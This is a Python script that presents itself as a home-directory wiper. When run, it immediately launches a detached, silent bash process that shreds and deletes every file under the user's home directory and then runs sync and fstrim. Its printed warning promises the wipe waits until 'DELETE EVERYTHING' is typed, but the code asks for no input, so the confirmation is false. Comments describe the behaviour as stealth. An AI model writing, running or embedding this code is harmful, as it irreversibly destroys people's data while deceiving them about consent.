import os
import subprocess
import sys

def wiperlinux():
    print("\033[91m!!! WARNING !!!\033[0m")
    print("This will PERMANENTLY destroy everything inside your Home directory:", os.path.expanduser("~"))
    print("\033[91mTHIS IS IRREVERSIBLE.\033[0m")
    print("\nOnce you type 'DELETE EVERYTHING', this script will vanish.")
    print("The deletion and secure wipe will run silently in the background.")
    
    # ==========================================
    # STEALTH MODE ACTIVATED
    # ==========================================
    
    home_dir = os.path.expanduser("~")
    
    # The bash script does the following:
    # 1. Uses 'shred' (-u removes the file, -z adds a final zero pass) to overwrite all files.
    #    The '+ ' at the end of -exec is CRITICAL for speed. It batches files instead of spawning a process per file.
    # 2. Finds all remaining directories and deletes them.
    # 3. Runs 'sync' to flush the file system journal.
    # 4. Runs 'fstrim' to force SSD hardware-level erasure (this is the true cipher equivalent for flash drives).
    bash_command = f'''
        # Overwrite and delete all files securely
        find "{home_dir}" -type f -exec shred -uzn 1 {{}} + 2>/dev/null
        
        # Delete all empty folders and remaining hidden files
        find "{home_dir}" -mindepth 1 -delete 2>/dev/null
        
        # Flush OS buffers to disk
        sync
        
        # Hardware TRIM (SSD wipe) - ignore if it fails due to permissions
        fstrim -v "{home_dir}" 2>/dev/null
    '''
    
    # Spawn the process completely detached from the terminal
    try:
        subprocess.Popen(
            ['bash', '-c', bash_command],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            start_new_session=True  # Detaches completely, survives terminal closure
        )
    except Exception:
        pass

    # Exit the Python script immediately so the terminal closes
    sys.exit(0)


wiperlinux()
